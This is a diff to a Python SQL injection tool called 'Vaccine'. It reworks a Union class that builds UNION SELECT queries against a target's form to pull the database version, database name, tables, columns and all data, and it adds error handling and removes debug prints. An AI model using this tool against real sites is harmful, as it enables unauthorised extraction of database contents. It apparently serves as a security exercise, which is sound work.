@@ -20,6 +20,9 @@ def error_exit(msg):
 	print(f"Error: {msg}")
 	exit(1)
 
+def error_continue(msg):
+	print(f"Error: {msg}")
+
 def form_url(url, add):
 	if add == "#":
 		return url
@@ -45,14 +48,16 @@ def get_diff(str1, str2):
 		ret = ret + d
 	return ret
 
-def print_result(str1, str2, query):
+def get_result(str1, str2, query):
 	diff = get_diff(str1, str2)
 	result = re.sub('<.*?>', '\n', diff)
 	result = result.replace(query, "[query]")
-	print(result)
 	return result
 
 class Union:
+	class UnionException(Exception):
+		pass
+
 	def __init__(self, submit):
 		self.submit = submit
 		self.delimiter = "'"
@@ -80,7 +85,10 @@ class Union:
 		query = self.header + "SELECT " + colums + contents + self.comment
 		print(f"{Style.CYAN}QUERY: {query}{Style.RESET}")
 		res = self.submit(query)
-		print_result(self.original_text, res.text, query)
+		result = get_result(self.original_text, res.text, query)
+		if not result:
+			raise self.UnionException("this method does not work")
+		print(result)
 
 	def get_version(self):
 		self.exec_union("@@version", "")
@@ -102,11 +110,16 @@ class Union:
 		self.exec_union("table_name", contents)
 
 	def union(self):
-		self.get_version()
-		self.get_database_name()
-		self.get_table_names()
-		self.get_column_names()
-		self.get_all_data()
+		try:
+			self.get_version()
+			self.get_database_name()
+			self.get_table_names()
+			self.get_column_names()
+			self.get_all_data()
+		except self.UnionException as e:
+			error_continue(e)
+		except Exception as e:
+			error_exit(e)
 
 class Vaccine:
 	def __init__(self, url, file, method):
@@ -126,7 +139,8 @@ class Vaccine:
 			self.password_field_name = field[0]
 
 	def __str__(self):
-		return f'''- url: {self.url}
+		return f'''[metadata]
+- url: {self.url}
 - request-url: {self.request_url}
 - method: {self.method}
 - username-field: {self.username_field_name}
@@ -140,7 +154,6 @@ class Vaccine:
 		filtered_froms = []
 		for form in forms:
 			method_match = re.search(r'method="(.*?)"', form[0])
-			print(method_match, self.method)
 			if not method_match:
 				continue
 			if method_match.group(1).lower() != self.method:
@@ -227,7 +240,6 @@ def main():
 	vaccine = Vaccine(args.url, args.o, args.x)
 	vaccine.vaccine()
 	print(vaccine)
-	print(args)
 
 if __name__ == '__main__':
 	main()
